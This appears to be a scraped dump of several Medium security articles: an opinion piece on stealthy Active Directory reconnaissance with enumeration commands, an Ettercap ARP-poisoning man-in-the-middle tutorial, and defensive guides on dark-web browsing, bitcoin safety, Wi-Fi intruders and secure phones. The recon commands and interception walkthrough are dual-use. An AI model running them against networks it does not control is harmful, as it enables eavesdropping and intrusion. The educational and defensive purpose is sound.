It’s very common to invite every year/quarter to the organization external pentesters who will provide detailed reports about the current security issues but the problem is that they hold totally different mindset. Pentesters have limited short time to make their report, it’s usually checklist and compliance driven analysis and in most cases it’s not even red-team oriented; pentesters tend to use NMAP scan because they don’t care about getting caught, they care about mainly creating huge reports with many items as possible and make it as fast as they can, so scanning tools would be good fit for their huge non-hacker reports.
*I’m really sorry if you are a different type of pentester and I offended you by my comments.
Many security folks are doing non-hacker certifications like CEH/CISSP/CISA which educate them with high level security stuff instead getting into hacker’s mindset and researching real data breach operations and APT’s which are public for everyone, for example — https://github.com/kbandla/APTnotes
Most security vendors are aligned with this mindset, but unfortunately there are some vendors offer a solution which can detect only port scanning and conficker types of attacks, so they will present it of course as the main issue with your internal visibility.
The very first reason is the lack of ability to evade security solutions:
If your victim has 3 servers and 5 PCs than you probably will succeed to hack anything and even use NMAP, but imagine a very large network with presence all over the world, 10k-100k end-points, how much time would it even take you to scan all of these end-points? How accurate would that information be? Very bad results…
The smartest thing to do which is what actually is being done is going stealthy after centralized point of data like Domain Controllers, SCCM, McAfee EPO, Management systems, Analytics systems and of course Admin PC/servers.
One quick example to emphasize the huge difference is reconnaissance the domain controller:
Every real red-teamer would start with this recon, making it a very good starting point since it’s legitimate and you would gain a really good perspective about computers, users, services, policies, credentials to make your attack stealthy and successful.
From an attacker point of view you don’t need to download any malicious files, only use legitimate files, windows API’s and processes which already exist on the victim’s machine such as cmd, dsquery, powershell, wmi, etc…
a. Net group “domain computers” /domain  b. dsquery computer -limit 0 c. Spn scanning — https://adsecurity.org/?p=1508
These centralized points of data are the core of the organization, they must be accurate so that the network assets and services will actually work.
Unlike NMAP, I don’t really need to check all the end-points in the organization, I just need to recon these focal points, which is legitimate and it doesn’t make any noise or huge traffic in the network.
If you are still not convinced and think that port scanning is your biggest threat, here are few simple steps how to configure your linux vm for such purpose:
Install ubuntu linux server on one of your internal vm’s(you can even use raspberry device with debian)
Install some services like apache, mysql, smb:
sudo apt-get install apache2 mysql-server samba
Install Suricata:
http://pastebin.com/raw/8xkqireU
Configure suricata.yaml with your internal IP addresses:
sudo vi /etc/suricata/suricata.yaml
And activate Suricata:
sudo suricata -c /etc/suricata/suricata.yaml -i eth0
watch it burn:
sudo tail -f /var/log/suricata/fast.log
I’m not saying getting into hacker’s mindset is easy, it takes years to have the knowledge and develop the ability to protect your company, however it’s really frustrated when I see security professionals who are not working hard to acquire the necessary knowledge, this is your job for god sake, stop chasing after non-useful certifications and read everything you can, train yourself and your team with real live scenarios and attacks to be a better professional.
Written by
","['Tech', 'Hacking', 'Cybersecurity', 'Mr Robot']"
How To Do A Man-in-the-Middle Attack Using ARP Spoofing & Poisoning,https://medium.com/secjuice/man-in-the-middle-attack-using-arp-spoofing-fa13af4f4633?source=tag_archive---------2-----------------------,"The following article is going to show the execution of “Man in the Middle (MITM)” attack, using ARP Poisoning. There are tons of articles and blogs available online which explains what this attack is. So, I am not going to do that here. The reason why these attacks work is due to the lack of any kind of authentication mechanism while updating ARP cache. New IP to MAC values always overwrite the previous values in the ARP cache.
Network Details
Gateway: 172.31.81.129 (00:16:d4:74:6e:7f)
Victim Node: 172.31.81.160 (14:58:d0:c8:c8:70)
My Node: 172.31.81.186 (30:f9:ed:d5:dc:04)
Requirements: Ettercap, Wireshark about the network on Layer 2 and Layer 3 will be helpful. I encourage you to read about ARP protocol before going on.
Readers knowledge on Layer 2 (Data Link Layer) and Layer 3 (Network Layer) will be helpful. I also encourage you to read about ARP protocol before going on.
Open Ettercap in graphical mode. You can do this is by running the following command in the terminal
ettercap -G
This will open the ettercap interface. Now click on the sniff option in the bar and select unified sniffing and select the interface (usually eth0). This will change the graphical interface to this
Now what you need to do, is scan all the available hosts in your subnet. Click ‘Hosts’ on the bar and select scan hosts. This will start the scan and output of the result will be posted in the terminal like window (present below in the interface). This will typically show the number of total hosts that were found active during the time of the scan. During the scan, Ettercap sends a number of ARP broadcast requests to the hosts (or potentially active hosts). All the replies are recorded for their MAC addresses. I started wireshark along with this in order to record the scan which started around 21:53:30. You can see (in the image below, Figure 2) bunch of ARP requests and replies taking place from serial number 41 to 111. The image below shed the light over this.
After you have performed the scan, you need to select the two hosts between which you want to execute your man in the middle attack. All the end nodes typically send their packets to the gateway whenever the packet is destined outside the subnet. The gateway of the subnet I am in is “172.31.81.129”. So, one of my hosts will be the gateway (“172.31.81.129”) and the other one will be the victim node. You can select any host from the scanned list. I chose the host with IP address “172.31.81.160”. Go to the scanned list by selecting “Hosts” from the bar and clicking on ‘host list’. Now right click on the hosts and add them as targets 1 and 2 correspondingly. The choice of target 1 and 2 won’t matter in our case as we will be intercepting packets from both directions.
Now comes the part where you poison the ARP cache and/or table. In order to do that click Mitm (short form for Man in the Middle) on the bar and select ARP poisoning. This will temper the values of ARP cache present in the victim nodes. Analyzing the packet we can observe that (serial no. 236) my PC spoofed itself with IP “172.31.81.129” by sending an ARP reply to “172.31.81.160”. As you can see, there was a warning (duplicate IP address detected) showing that this IP address is being used by another IP node, which not taken seriously by the ARP modules and is mostly for administrators. Similarly (in serial no. 237) my PC spoofed itself as 172.31.81.160 by sending the ARP reply to the gateway. Similar duplicate IP address warning was there. This tempers the ARP cache of the gateway. Similar attempts were made by my PC as can be seen in serial numbers 245–246 and 251–252. Now we are ready and the attack can take place successfully.
As can be seen, from serial number 247, all the packets with source and destination addresses of 172 .31 .81 .160 and 172 .31 .102 .14 are going through my PC. The victim node is surely connected to the 172.31.102.14 proxy-server. So all the packets from the victim node is first coming to my PC, then going to the gateway. Similarly, any packet destined for the victim node is first forwarded from the gateway to me and then my PC forwards it to the victim
Important Points
Let’s see what happens after the ARP cache is poisoned in the gateway and the host. Notice that the cache is not poisoned in my PC, it knows the correct MAC address for IP addresses. Victim’s packet has the destination IP address of the Proxy server he is connected to (172.31.102.14 in our case) and his source IP. The next hop address is the gateway. When Link Layer receives the packet it needs to add MAC address of the gateway. Since the ARP cache is corrupted, the destination MAC address of my PC will be inserted. When my link layer receives the packet it sends it to the upper layer (Network Layer). The next hop address is not mine, and thus my ARP module inserts the correct MAC address and forwards the packet to the gateway. We are good here as our Wireshark has already received the packet and can be analyzed later on. The same thing happens when gateway needs to forward the packet to our victim.
One thing that you can ponder about, is why this attack only works when the victim is present in your subnet?
For an attacker, this is normally not a big problem. He can easily take his laptop to the network he is planning to attack. These kind of attacks are very common in public Wi-Fi and other open places.
It is very unlikely though, that one can find something confidential in the packets. Today almost all layers encrypt data before forwarding it to the next layer. In application layer, most of the web pages use https protocol, which is a secure method of communication. The transport layer is often enhanced with SSL for encryption purposes. Similarly, Network layer implements IPsec. Cryptography doesn’t seem that bad now.
There are many other attacks, like Denial of Services (DoS), which can be executed. There many other kinds of information that the attacker can gain regarding the host, which can be used to launch other attacks. What can be done, is left on the readers to think about. After all the network is full of attacks and hacks. The attack described above is a passive attack as no intercepted packet was tempered. Someone can extend the above attack to active, and then things can actually become very nasty.
Now comes the non-technical part. The document was presented just for educational purposes. Readers must carefully consider their actions before implementing them. Also, don’t try this in the switches and subnets that don’t belong to you or are present in the public domain.
Editors Note: Put a WEBGAP between you and the malware with a browser isolation technology or by leveraging a remote browser service.
Written by
","['Opinion', 'OSINT', 'How To', 'Networking', 'Hacking', 'Computer Science', 'Cybersecurity', 'How To']"
How to enter the dark web safely: a step-by-step guide,https://medium.com/@deepwatch/how-to-enter-the-dark-web-safely-a-step-by-step-guide-819ba4e2cd6f?source=tag_archive---------3-----------------------,"We at DeepWatch monitor illegal activities in the deep web. Our clients may from time to time examine the identified evidence themselves. This article helps them in the process.
So, you’ve heard of the “dark web” or “darknet”, a hidden internet infamous for hosting illegal activities. You may wonder what it actually looks like. Or your organization recently got hit by data breach and you want to look into it yourself.
You’ve probably also heard the dark web is a dangerous place, one that only an intelligence officer can get in and out of without losing a finger or two.
Is it true?
As it turns out, interacting with the dark web can be a relatively safe process even if you are not a security expert. To enter the dark web safely, we recommend this “super onion” setup as a reasonable approach to prevent bad guys from 1) Knowing who you are, 2) Attacking your computer, and 3) Stealing your data:
Be daunted by this epic onion not. In this article, we will explain how to build it layer by layer. It’s easier than you might think.
Prerequisites: You are computer savvy. You understand no security solution is 100% safe. You aren’t going to do any illegal stuff — our method is not designed for escaping law enforcement.
Make sure to follow each and every step. Do not skip them or change their order. Your system could become vulnerable otherwise.
Let’s go.
Virtual private networks (VPN) hide your real internet address in the event an attacker gains control of your VM. Items 1 to 5 below can be done using public wifi for better privacy protection.
Note: Skip items 2 and 4 and sign up with your real email and credit card if you prefer convenience and believe the VPN is unlikely to be hacked.
Tor Browser is the browser for the not-so-bright web. You will run it in a VM. It provides a necessary layer of protection in the event your Tor Browser is compromised.
And voilà, it’s ready to go! Visit dark web sites by entering “.onion” URLs in the Tor Browser. See “Useful Resources” below to find URLs that strike your fancy.
Are you all set? Not yet.
Please read on for some very important messages:
Do launch the Super Onion from the outer layers and work your way inward. For example, connect to the VPN only in the surfer account; power on the VM only after the VPN is fully connected.
Do terminate your Super Onion in the reverse order: Power off the VM first, then cut off the VPN, then log out the surfer account:
Do NOT perform other activities using the surfer account aside from running the VPN and VM. Enter absolutely no personal information in the surfer account and particularly in the VM.
Do NOT share files between the VM and the host system. If you have to, use a USB drive, format it, transfer files, and reformat it right after. Unless you’re a security expert, never open files retrieved from the dark web.
Do NOT pause the VM or switch between the surfer and other accounts. Always power off the VM and log out all accounts completely.
For the obviously paranoid: Duct tape your webcam.
Finally, remember that you are never 100% safe.
Thank you for reading thus far! Leave notes anywhere in this post for questions or comments.
We at DeepWatch monitor cyber threats on the dark web. Get your business protected today at GoDeepWatch.com.
DeepDotWeb has tons of useful information including news, tutorials, and status reports of top markets and forums in the dark web.
Tor Hidden Wiki and The Hidden Wiki are the unofficial directories for the dark web. Be mindful that they may contain out-of-date and malicious links.
There are search engines in the dark web, too. Check out the above wikis for a list of them.
If you need an anonymous email address, check out Guerrilla Mail or one of these alternatives. Although these services do not provide privacy, meaning whoever has the email address can read your emails. For anonymity and privacy, create a free email account as mentioned in Step 2.
Important resources will continue to be added as we discover more. Please check back from time to time!
This section is for those exploring other options for dark-web surfing.
A Super Onion with reduced layers?
We believe that no layer in our onion is dispensable. Some online articles suggest that the VM layer is optional. But this is potentially dangerous because the Tor Browser can be a target of exploits.
Yet other online solutions don’t include the VPN layer. We argue against it because malware in the Tor Browser or the VM could obtain your real IP address fairly easily.
Setting up the non-administrative surfer account is to prevent personal activities from using the VPN. It is also to defense against human mistakes as well as exploits in the various applications installed on your OS.
Alternative setups
While the Super Onion offers a good balance between usability and safety, solutions with better anonymity, privacy, and/or security do exist. Most require running a special OS on bare-metal computers. It’s worth noting that Whonix does not provide better safety than our onion for dark web browsing.
One such solution is Qubes OS. It runs Xen hypervisor on bare metal and segregates different security domains into VMs. You can easily run processes and open files in dedicated throw-away VMs. Named the most secure OS, Qubes does come with some tradeoffs: it demands beefy hardware, is very slow to install, and might be incompatible with your PC — even if you have an extra one to spare.
Tails is a live OS that runs on a USB stick for privacy and anonymity. It requires a non-Mac computer. A concern with Tails is that it runs on bare metal without a VM. Your IP address, MAC address, or other hardware serial numbers could be exposed if the OS is compromised. That being said, the probability of such incidents is low given the secure nature of this OS.
Alternative VPNs
There are many VPN providers. Check out their reviews online. You should choose a VPN that:
It’s notable that as of June 2017, NordVPN is running a promotion of only $3.29/mo for a 2-year contract.
Alternative VMs
Instead of VirtualBox, you can use VMWare Player for Linux and Windows or VMWare Fusion for Mac OS X. The Mac version isn’t free though.
We chose Debian for its light weight and strong privacy. In contrast, Ubuntu is more user-friendly but more intrusive on user privacy by default. If you choose Ubuntu, do the following right after installation:
Happy surfing the dark web! We hope you’ve enjoyed this article.
Be sure to follow us here at Medium or Twitter for dark-web related tips and insights.
We at DeepWatch protect your business from cyber threats with 24/7 monitoring on the dark web. Visit GoDeepWatch.com and get covered today.
Written by
","['Free tools', 'Windows', 'Ubuntu', 'Windows', 'Ubuntu', 'this site', 'these alternatives', 'privacy.com', 'Bitcoin ATM', 'Download', 'Download', 'here', 'DNS leaks', 'Doileak', 'kill switch', 'Privacy', 'Darkweb', 'Cybersecurity', 'Tor', 'Deep Watch']"
How to Secure Yourself Against Bitcoin Theft in 10 Minutes,https://blog.sfox.com/how-to-secure-yourself-against-bitcoin-theft-in-10-minutes-28ce1d7559d?source=tag_archive---------9-----------------------,"On December 20, 2013, Bloomberg TV anchor Matt Miller accidentally gave viewers an important lesson in Bitcoin security.
As part of a 12-day segment on Bitcoin, Miller gave two TV anchors paper wallets with $20 of Bitcoin each. As he handed them out, though, he exposed one of their private keys on camera—and, a moment later, the bitcoins in that wallet had disappeared, taken by a Reddit user who was apparently a little more Bitcoin-savvy than Miller.
There are lots of ways out there to lose your Bitcoin, if you don’t understand the best practices for keeping them safe.
Fortunately, just like you don’t need to be a computer scientist to buy and sell Bitcoin, you don’t need a technical background to make your Bitcoin holdings much more secure. If you own Bitcoin, take ten minutes today to make sure you’ve done these things — because it won’t feel urgent until you’ve already been robbed.
An uppercase letter isn’t enough to make your cryptocurrency account passwords strong. Your passwords should all meet the following criteria:
The stronger a password is, of course, the harder it is to remember. That’s why you need a resource to make sure you don’t forget them and lose access to all your money. Two good options include:
Be sure to use a different password for every one of your accounts. Otherwise, a single security breach will give a hacker access to all your information — and you can’t trust every service for which you register to store your password with top-notch security.
Two locks on your accounts are better than one, especially when hackers everywhere are constantly working on new ways of circumventing locks. Whenever you have the option, you should enable 2-Factor Authentication (2FA). And the chances are good that you have this option in more places than you realize. 2FA is a way of using a second type of identification, in addition to your password, to authorize access to your account. There are a number of different ways to do this — but not all of them are recommended. Never enable 2FA that verifies your identity using a phone call or a text message. Hackers have become very good at calling up phone companies and convincing those companies that they’re you, at which point phone-call or text-message 2FA makes your account less secure, not more secure. Enable 2FA using one of these methods instead:
Look in the security sections of all your Bitcoin accounts now and enable 2FA. Also be sure to check your email accounts: many people overlook securing their email accounts, and email gets hacked all the time.
Especially when you’re trading on exchanges, the more layers of security you can get, the better. Beyond 2FA, you should check whether the exchanges you’re using allow for whitelisting: only allowing specific addresses to interact with the funds you have on the exchange. There are two main kinds of whitelisting you should seek out in exchanges’ security settings:
Not all exchanges have these whitelisting capabilities right now, so actively check to see if the ones you use do — and, if they support it, whitelist your addresses right now.
Public WiFi connections are easy prey for hackers. If you’re connecting to public WiFi with a computer that stores info on your Bitcoin accounts, you’re playing with fire. If you insist on doing this, the best practice is to make sure you’re always using a virtual private network (VPN) when you’re connected to public WiFi. A VPN basically adds a layer of encryption between you and the internet at large, even when you’re on a public WiFi connection. It can make you feel a lot better about using your personal computer in a Starbucks. There is a wide range of VPNs on the market and different tech outlets endorse different particular providers, but pretty much everyone agrees that free doesn’t cut it. If you have a decent amount of money in Bitcoin, you should be willing to pay $5-$10/month to keep it safe. Some of the most reputable VPNs out there right now are:
The added layer of security will make it that much harder for prying eyes to get access to your passwords, private keys, and seed phrases.
Hopefully, you’ve heard the adage that you shouldn’t be trading with more capital than you’re willing to lose. That extends even further in the world of cryptocurrencies: you shouldn’t store access to any more of your cryptocurrencies on an exchange — or even online — than you’re willing to lose.  When your Bitcoin is stored with an exchange or in an online wallet, it is susceptible to dangers like trojans and exchanges getting hacked. So, when it comes to all the Bitcoin you’re hodling instead of trading, you need a cold wallet: a private key that you keep securely offline. Consider moving your non-trading funds to cold wallets like these:
If most of your coins are in cold storage when an exchange you used is hacked, your loss will be mitigated tremendously.
One of the major value propositions of cryptocurrencies is that the decentralized nature of blockchains makes it harder for systems to have a single point of failure. Take a lesson from that: you should have enough backups of your passwords, private keys, and seed phrases that your Bitcoin is safe beyond any single point of failure. If you have a flash drive or two lying around, take a minute to encrypt them and add text files containing info on all of your exchange accounts and wallets. These are your last line of defense if you need to recover an account or access a wallet whose details you’ve forgotten. You don’t need any special software to encrypt a flash drive: just right-click on the drive in your “My Computer” window and select the “encrypt” option, following the on-screen instructions to set up a password for it. Store these drives in different, secure places. If these backups aren’t 100% secure, they’ll end up being the weakest link in your security: if someone finds one and is able to decrypt it, all your Bitcoin will vanish. Ideally, keep your backups in a safety deposit box — or, even better, split your keys across multiple drives (e.g., half of your paper Bitcoin wallet’s private key on one drive, and the other half on the other). That way, even if someone somehow manages to steal one drive, they still won’t be able to access your funds. The more backups you can keep in different places, the better — just don’t forget the passwords to decrypt them!
On April 16, Matthew Mellon died, leaving over $500 million of XRP in cold wallets all over the U.S. Because no one in his family knew his private keys, it’s unclear whether they’ll ever be able to access those funds. You need to balance your funds’ security and your assurance that your funds will go to the right people after you’re gone. Eventually, you should talk to a lawyer about the right way to pass along your cryptocurrency in your will. For today, though:
If you want your wealth to survive you, make sure that the right people know where to find it and how to use it.
Okay, maybe doing all this will take you a little longer than 10 minutes — but you can definitely do most of it before you go to sleep tonight!  These tactics won’t make your cryptocurrency as secure as Fort Knox — and there are plenty of steps to make it more secure — but this is the absolute minimum level of security you should accept if you’re holding any real amount of crypto. And, with these measures in place, odds are that you’ll sleep much better tonight knowing your Bitcoin won’t be gone in the morning.
The above references an opinion and is for informational purposes only. It is not intended as and does not constitute investment advice, and is not an offer to buy or sell or a solicitation of an offer to buy or sell any cryptocurrency, security, product, service or investment. Seek a duly licensed professional for investment advice. The information provided here or in any communication containing a link to this site is not intended for distribution to, or use by, any person or entity in any jurisdiction or country where such distribution or use would be contrary to law or regulation or which would subject SFOX, Inc. or its affiliates to any registration requirement within such jurisdiction or country. Neither the information, nor any opinion contained in this site constitutes a solicitation or offer by SFOX, Inc. or its affiliates to buy or sell any cryptocurrencies, securities, futures, options or other financial instruments or provide any investment advice or service.
Written by
","['All Articles', 'Blockchain Tech', 'Coin Analysis', 'Trading Insights', 'Interviews', 'dictionary attacks.', '1Password', 'Google Authenticator', 'YubiKey', 'wallets', 'ExpressVPN', 'NordVPN', 'VyprVPN', 'Hardware wallets', 'Trezor', 'Paper wallets', 'Bitcoin', 'Cybersecurity', 'Crypto', 'Best Practices', 'Blockchain Tech']"
How to See Who’s On Your Wi-Fi - PC Magazine - Medium,https://medium.com/pcmag-access/how-to-see-whos-on-your-wi-fi-d01dd8c8932e?source=tag_archive---------5-----------------------,"Is your internet sluggish? If you suspect a neighbor is stealing your Wi-Fi, these two apps can help you identify devices using your connection and help you boot them off.
By Whitson Gordon
Is your internet moving a little slower than usual? Are you seeing hints of devices you don’t recognize in Windows Explorer, or when you cast media to your TV? If you suspect a neighbor is stealing your Wi-Fi, here’s how to check (and boot them off).
“So someone’s watching Netflix on my internet,” you may say. “What’s the big deal?” Even if you have a little bandwidth to spare, you probably don’t want other people on your network, especially if it’s unsecured. If someone has access to your network, they have access to all the computers on that network, and that’s dangerous. They could access files you’re unknowingly sharing, they could infect you with malware, and in certain situations they could even steal your passwords and other personal information.
As a result, you should take care to make sure each device connected to your network is one you can trust. Thankfully, there are free tools that’ll help you see everyone on your Wi-Fi right now.
Windows users can download a free, portable program called Wireless Network Watcher (scroll down to the Zip download link below “Feedback” to get it), and Mac users can download a free, slightly more complex program called Who Is On My WiFi from the Mac App Store. Both tools will provide a list of every device currently connected to your network, so you can identify the ones that belong to you.
To use Wireless Network Watcher, just launch the program, and it will immediately begin scanning your network. This will take a minute or two — you’ll know it’s working if the bottom-left corner reads “Scanning…” Once it’s done, that message will disappear, and you’ll be presented with a full list of connected devices.
The resulting list may look a little cryptic, especially if you aren’t super tech-savvy, but don’t worry. You can ignore the IP address and MAC address listings for now. If you’re using Wireless Network Watcher, just focus on the “Device Name” and “Network Adapter Company” columns.
For example, I see an item named “Dulce” in Wireless Network Watcher, which is the name of my wife’s MacBook. I see another with no name, but with “Philips Lighting BV” as the network adapter manufacturer, which means it’s probably the hub for my Philips Hue lights. You can double-click on a device to add “User Text” that helps you identify each device, which will help you narrow down all the items in this list.
To use Who’s On My WiFi, launch the program and choose “Yes, set up continuous automatic scanning” from the popup. Click Proceed on the next window, and the app will begin scanning your network for devices. You’ll see the “Scanning” message in the upper-right-hand corner when it’s working, so just give it a minute to do its thing.
If you’re using Who Is On My WiFi, the “Description” column and the “Manufacturer” name that appears in the right pane when you click on an item is what you need. These two values will clue you in to what each device is.
In Who Is On My WiFi, you can’t give custom names, but you can give the device a label like “Desktop” or “Tablet” and mark it as “Known.” Go through the list and mark all the items that are familiar to you.
If you’re lucky, you’ll be able to recognize all the items on that list, but there may be a few that don’t have enough information. After going through my list, for example, I was left with a couple devices that listed no name and no manufacturer. However, I was able to get a little more information from my router’s web interface.
Open your router’s management page by typing its IP address in your browser’s address bar. (If you’ve never done this before, you can read more about how to do it here). Once there, look for an option that sounds like “Attached Devices” or “Client List.” This will present you with a similar list as Wireless Network Watcher, but the information may be slightly different. After cross-referencing the unknown devices between the two, I found one of them was listed as “AzureWave Technology, Inc” in my router’s interface, but not Wireless Network Watcher. A little Googling revealed that this was my Rachio sprinkler system, so I was able to mark that down and move on.
If you see any other unlabeled devices in the list, check around your house for any internet-connected gadgets you might have missed. I realized that my Amazon Echo wasn’t listed, so after checking the Alexa app on my phone, I was able to match its MAC address to one of the unlabeled items in Wireless Network Watcher.
If all goes well, you should be able to identify every device on your network. If there are any left over, and you’ve combed your house looking for other internet-connected devices and found nothing, there’s a chance someone nearby may be using your Wi-Fi.
Even if you discover that a neighbor is stealing your Wi-Fi, you don’t need to hunt them down and start a fuss — you can just kick them off with a change in router security. Head back to your router’s web interface and find the option to change your password (usually under the “Wireless” section somewhere). If you don’t have a password, you absolutely need to start using one, and it needs to be strong. Without a password, your personal information is up for grabs to any amateur hacker that drives by. Choose WPA2 for the password type, since it’s far more difficult to crack than the now-outdated WEP.
If WPS is turned on, you should turn it off, since this feature makes it easier for people to crack your Wi-Fi password. (If you want to let guests on your Wi-Fi without giving them access to your devices and information, you can always enable your router’s guest network.)
If you already had a password — maybe it was weak and easy for your neighbors to guess — changing it to something new should be sufficient to kick them off. Of course, you’ll also have to re-authenticate all of your devices, but you should be able to rest a little easier knowing that all the devices on your network belong to you.
Read More: “7 Lego Projects You Can Help Make a Reality”
Originally published at www.pcmag.com.
Written by
","['Computing', 'Mobile', 'Tips & Tricks', 'Consumer Electronics', 'Internet', 'Future Tech', 'Technology', 'Wifi', 'Cybersecurity', 'Security', 'Network', 'Technology']"
How to Set Up a Secure Phone - David Koff - Medium,https://medium.com/@TheTechTutor/how-to-set-up-a-secure-phone-c8f3ad090871?source=tag_archive---------7-----------------------,"This post’s been brewing for a while now. It combines almost every approach I’ve researched in regards to security, privacy, and maintaining anonymity in our world of corporate and government oversight. It dawned on me as I was writing my Firewall series on Medium that the most vulnerable among us needed a simple how-to guide on setting up a safe and secure communication device. This post is the culmination of that idea.
Some of you, who are NOT the most vulnerable will think some of the recommendations on this list are extreme. You’re right: they are. Please keep in mind, that while many of the items on this list are smart for any digitally aware citizen, the list is — truly — designed for whistleblowers, journalists, dissident citizens living in oppressive countries, and the strongest of privacy advocates.
First, it’s worth reminding ourselves why this guide is 100% necessary:
There are those among us whose desire for free and unmonitored communications results in arrest or imprisonment. There are those among us who are imprisoned simply for speaking out against their government. Hundreds of journalists who attempt to share vital information with the public have been imprisoned recently. Or outright murdered. With life and death on the line, the stakes are very, very high.
To begin, we’ll need to understand that a truly secure communication device not only requires specific hardware and software, but it also requires specific guidelines for when how, when, and where users should attempt to use that device. That means changing your behavior which is far harder than changing your operating system: it takes discipline, focus, and determination. Just know: you’ll need to use and treat your secure communication device VERY differently than you would your normal, everyday cellphone.
Next, we’ll want to assume that our adversary has the time, intelligence, and money they need to get what they want from our communication device. Our goal is to make that mission impossible or as difficult as possible for them. To do so, we’ll need to understand how our adversary works and then build that into our security approach.
For example, using the application Signal isn’t enough. Yes, Signal uses a very secure technology called “end-to-end-encryption” (or E2EE) to protect all user messages from prying eyes. And yes, E2EE is so secure that even if Signal wanted to spy on users of its own platform, it couldn’t. But your adversary already knows this. Hackers who really want to target you will instead look for methods to circumvent that block. And one of the easiest ways to get around Signal is to try to compromise your entire cellphone or computer. This is known as capturing an “endpoint”. Once an adversary has used malware to control or observe your endpoint, then they can see your messages as you type them, before they are encrypted.
Not good.
Therefore, for those in the direst of circumstances who are looking to have the most secure possible communications, I’d advise the following ground rules to best prepare for doing battle against an unseen and dangerous foe.
Purchase a second smartphone as your secure communication device. If you’re on a budget, buy an older, used model from a reputable source. Apple sells refurbished iPhones. So does Gazelle. Use your main smartphone for all of life’s normal, unsecured stuff like social media, email, online shopping, and casual text messages; ONLY use your second smartphone for secure communication — nothing else.
Ensure your second device an iOS device. While some of you will balk at this, Apple’s iOS is — by far — safer than either Microsoft’s Windows or Google’s Android. These results have been confirmed by others. Repeatedly. And then again. And then again.
Only install the base OS and secure messaging apps on your “secure iPhone”. Fully erase any new or used iPhone you purchase before installing iOS — only iOS 9 and later — and your security apps. Never install any email, social media, transportation apps, online shopping or banking apps or establish any connections to iCloud: INSTALL NOTHING BUT IOS AND SECURITY APPS. Sorry for shouting, but that last point is super important.
Set a long, complex password on your secure iPhone. If you don’t know how to enable a longer password, here’s a simple how-to-guide.
Disable TouchID and FaceID. Never, never, never, NEVER allow your biometrics to unlock a device: that’s a gift to your enemies. Yes, that’s an inconvenience for you, but so is being jailed or killed.
Disable your secure iPhone from collecting your geolocations. Turn off the “Significant Locations” setting on your iPhone. To find this rather buried preference, Open the “Settings” app and tap through to Privacy -> Location Services -> System Services -> Significant Locations. Shut it off.
Purchase and use a security screen for your secure iPhone. This will reduce the ability of others to see what’s on your screen. Privacy screens exist for iPhone X, iPhone 6/7/8, iPhone 5’s, and earlier.
Ensure that your home network is secure. I can’t guarantee which internet router you keep in your home, but I can guarantee that you should make changes to your router to make it more secure. Most home routers are made by a handful of companies. Find the make and model of your router — usually printed on the side or bottom of the device — and then visit the website that supports the router you purchased from Belkin, Netgear, Cisco, Asus, TP-Link, or Motorola. Those websites provide the documentation to show you how to do what I’ll now suggest:
Ensure your home is free from all bugs and snooping devices. First, throw away all Amazon Alexa and Google Home devices. Now: out the door. The Alexa devices can record and send sound files without your permission and the Google devices, well…
Next, if you have any reason to believe that you’re being surveilled, monitored or bugged, purchase an affordable bug sweeper. These handheld devices can be used sweep your home, hotel room, car, or any other location for hidden cameras, microphones, or other bugs that operate using radio frequencies.
Only use your secure iPhone at home, if possible. Now that you’ve got a reliable and more secured home and home network, use your secure iPhone there. You have far more control over your home network and your physical home space than you do any other network or space. Use that to your advantage.
If you must use your secure iPhone in public, be smart. When in public, be aware of who might be able to see your screen or hear your voice. Reduce or eliminate exposure by maneuvering smartly: sit where there’s a wall behind you; don’t use Siri; only communicate via text, no voice or video chats; consider checking your messages under the table.
Find and use a reputable and safe VPN. If you live in under an oppressive regime, then you might need a VPN to even download some of the apps I’ll recommend, let alone use them. This is most likely true for citizens of China, Egypt, Cuba, Oman, Qatar, Russia, Iran, and the UAE to name but a few. Read my piece on how to choose a proper VPN and then, please: use it smartly. Also, use it constantly to provide yet another layer of encryption.
For secure messaging, use Signal. Signal is the industry leader in E2EE messaging. Think Signal messages as a kind of super secure text message that only you and your intended recipient can read. Download the iOS app here. It’s free. Then, learn how to use the app safely here. And remember: never use the Signal desktop application on your computer. Never. Your job is to have one device — only one! — from which you send secure communications. That device is now your secure iPhone, not your much-easier-to-hack desktop computer.
For secure emailing, use ProtonMail. ProtonMail is one of the industry leaders in secure emailing. ProtonMail emails sent between two users can only be read by those users. Download the iOS app here. It’s free. Then, insist that anyone who wishes to contact you via email ALSO download and use ProtonMail.
Disable all lock-screen notifications. Yes: all of them. There’s no sense in allowing someone who walks past your phone to casually see notifications popping up on your lock screen from that secret informant you have at The White House or The Washington Post. That defeats the purpose. Here’s a simple guide for iOS devices.
Leave your secure iPhone powered off when not in use. Airplane mode doesn’t count here: the device must be powered down. If this sounds extreme, consider: top hackers can pull information from a device if it’s powered on.
Never leave your secure iPhone unattended. Have to shower? Purchase a waterproof case and bring it in with you. If that sounds absurd, then consider buying a safe and leaving your secure iPhone in there — powered off — when not in use. If an adversary has easy physical access to your device, then all of the safety and security you’ve worked so hard to achieve will be for naught.
Never bring a cellphone to a secure or private meeting. It is now commonly understood — and this EFF document makes it 100% clear — that your cellphone tracks your location. And more. Therefore, if you have an important meeting with a confidential source, don’t bring a cellphone. In fact, don’t bring any electronics. Go old-school: and grab yourself a paper and pencil.
Bonus advice for my more advanced readers: setup a firewall device for your home network. A firewall is a kind of software or hardware that sits between the open internet and you and helps to protect you from the most common kinds of online attacks. While software firewalls can be effective, hardware options are considered more powerful and far faster. Some devices also offer features such as the ability to connect back into your home network with a VPN. Models like this Zyxel are considered among the best in class for home networks and run around $400. Models that cost closer to $200 — such as this BitDefender 2 model — are also well-reviewed but have fewer features. Entry-level firewalls like the CUJO2 are very easy to set up but lack some of the more advanced features that some people might prefer. Pro tip: buy a used model to save money.
I’ll caution — as I always do — that all security and privacy is based on best efforts, best research, and best practice. Nothing is 100% safe. That being said, I think this list of recommendations is easy-to-follow and easy-to-implement for most people. For now, at least. Just remember: as the times change, the tech changes, and that means our approach to security must also change.
Sadly, it takes a financial investment to purchase the gear you’ll need to accomplish the goals I’ve laid out: a new or used iPhone, a bug sweeper, a screen protector, a reputable VPN provider and, perhaps, a firewall. I understand this makes it difficult or even impossible for some people to participate in what I’ve laid out.
I find that to be truly awful: it shouldn’t cost money to be guaranteed free and private communication. The sad truth is that it does. If you have the money, I hope you’ll consider my suggestions and invest wisely. If you don’t, then I hope you’ll save and pool funds with friends. Perhaps, there’s an opportunity to share a device together.
